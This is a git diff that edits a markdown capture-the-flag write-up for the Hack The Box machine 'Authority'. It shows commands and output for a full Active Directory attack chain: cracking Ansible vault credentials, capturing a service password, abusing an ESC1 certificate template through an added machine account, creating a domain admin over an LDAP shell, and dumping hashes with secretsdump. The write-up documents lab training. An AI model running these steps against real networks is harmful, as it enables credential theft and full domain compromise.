@@ -112,6 +112,7 @@ Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
 Lets generate the hosts and krb5.conf file using nxc
+
 ```
 ╭─xcr@pwnage ~/HTB/authority
 ╰─➤  nxc smb 10.129.229.56 --generate-hosts host
@@ -142,7 +143,8 @@ SMB         10.129.229.56   445    AUTHORITY        NETLOGON                    
 SMB         10.129.229.56   445    AUTHORITY        SYSVOL                          Logon server share
 ```
 
-- Lets login in and check 
+Lets use impacket-smbclient to login and check
+
 ```
  impacket-smbclient authority.htb/xcr@authority.authority.htb
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
@@ -194,10 +196,12 @@ drw-rw-rw-          0  Fri Mar 17 14:37:52 2023 SHARE
 /Automation/Ansible/ADCS/molecule/default/prepare.yml
 Finished - 79 files and folders
 ```
+
 The directories contains a bunch of ansible files, Lets explore them, 
 The PWM directory as there is a web service exposed as well, lets try to find some credentials
 
 - the main.yml file in default contains encrypted credentials
+
 ```
 cat main.yml
 ---
@@ -229,6 +233,7 @@ ldap_admin_password: !vault |
           3764
 ```
 
+format the hash and use ansible2john to make them crackable by hashcat
 
 ```
 ansible2john
@@ -276,13 +281,14 @@ sudo responder -I tun0
 ```
 
 we can winrm with the svc_ldap account
+
 ```
 nxc winrm authority.authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
 WINRM       10.129.229.56   5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
 WINRM       10.129.229.56   5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
 ```
 
-Get the user flag
+
 ```
 evil-winrm-py -i authority.authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
           _ _            _
@@ -302,10 +308,11 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -ar---        7/30/2025   4:42 PM             34 user.txt
 ```
-
+---
 ## Root
 The machine had only one svc_ldap user profile and administrator and no special privs as well, Let check for adcs
 lets check certipy if there are vulnerable certs
+
 ```
 Certificate Templates
   0
@@ -360,8 +367,9 @@ Certificate Templates
 
 We can see that svc_ldap can request CorpVPN which is vulnerable to ESC1. Lets exploit to get administrator
 Lets also get the domain and admin SID's
+
 ```
-impacket-lookupsid authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'@authority.authority.htb                                                                                             130 ↵
+impacket-lookupsid authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'@authority.authority.htb                                                                                             
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Brute forcing SIDs at authority.authority.htb
@@ -395,6 +403,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 
 But we are unable to request cert as this is only for Domain Computers
+
 ```
 certipy -debug req -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -ca AUTHORITY-CA -template CorpVPN -dc-ip 10.129.229.56 -target authority.authority.htb -upn 'administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500' -dc-host authority.authority.htb -ns 10.129.229.56
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -417,6 +426,7 @@ Would you like to save the private key? (y/N): n
 ```
 
 Every user is able to add computer to the domain, Lets check if there is quota available
+
 ```
 nxc ldap authority.authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq                                                                                                      130 ↵
 LDAP        10.129.229.56   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
@@ -425,7 +435,8 @@ MAQ         10.129.229.56   389    AUTHORITY        [*] Getting the MachineAccou
 MAQ         10.129.229.56   389    AUTHORITY        MachineAccountQuota: 10
 ```
 
-- Add a computer
+Add a new computer account
+
 ```
 impacket-addcomputer authority.htb/svc_ldap -computer-pass 'newPass123!' -dc-ip 10.129.229.56 -method LDAPS
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
@@ -434,7 +445,7 @@ Password:
 [*] Successfully added machine account DESKTOP-P3N8EWHF$ with password newPass123!.
 ```
 
-- lets request cert now
+Lets request the cert now
 
 ```
 certipy -debug req -u 'DESKTOP-P3N8EWHF$@authority.htb' -p 'newPass123!' -ca AUTHORITY-CA -template CorpVPN -dc-ip 10.129.229.56 -target authority.authority.htb -upn 'administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500' -dc-host authority.authority.htb -ns 10.129.229.56
@@ -464,6 +475,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
+Now with the pfx unpack the hash
 
 ```
 certipy auth -pfx administrator.pfx -domain authority.htb -username administrator -dc-ip 10.129.229.56
@@ -479,9 +491,8 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [-] Use -debug to print a stacktrace
 [-] See the wiki for more information
 ```
+
 - Trying to unpac the hash fails due to missing certificate so we can use ldap-shell
-
-
 
 ```
 certipy auth -pfx administrator.pfx -domain authority.htb -username administrator -dc-ip 10.129.229.56 -ldap-shell                                                                   1 ↵
@@ -522,7 +533,8 @@ Type help for list of commands
 
 ```
 
-- I will create a new user and add to domain admins
+I will create a new user and add to domain admins
+
 ```
 # whoami
 u:HTB\Administrator
@@ -533,7 +545,8 @@ Adding new user with username: xcr and password: Elo+Y?Q[Fm&79\) result: OK
 Adding user: xcr to group Domain Admins result: OK
 ```
 
-- Now secretsdump
+Now we can `secretsdump` to get administrator hash
+ 
 ```
 impacket-secretsdump authority.htb/xcr@authority.htb -dc-ip 10.129.229.56
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
